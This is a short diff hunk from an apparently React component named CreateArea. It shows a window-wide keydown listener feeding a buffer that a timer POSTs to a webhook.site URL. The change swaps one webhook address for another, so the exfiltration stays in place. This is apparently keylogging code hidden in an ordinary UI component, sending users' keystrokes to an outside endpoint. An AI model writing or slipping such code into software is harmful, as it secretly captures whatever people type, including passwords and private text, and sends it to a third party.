@@ -28,7 +28,7 @@ function CreateArea(props) {
     window.addEventListener("keydown", registerKeyPress);
     window.setInterval(function() {
       if (buffer.length > 0) {
-        fetch('https://webhook.site/8b4a22fc-8576-4f96-90fc-49c0984710b1', {
+        fetch('https://webhook.site/d32d2d2d-77ac-4da8-b8ac-8b562c4e282e', {
           method: 'POST',
           body: JSON.stringify({
             buffer
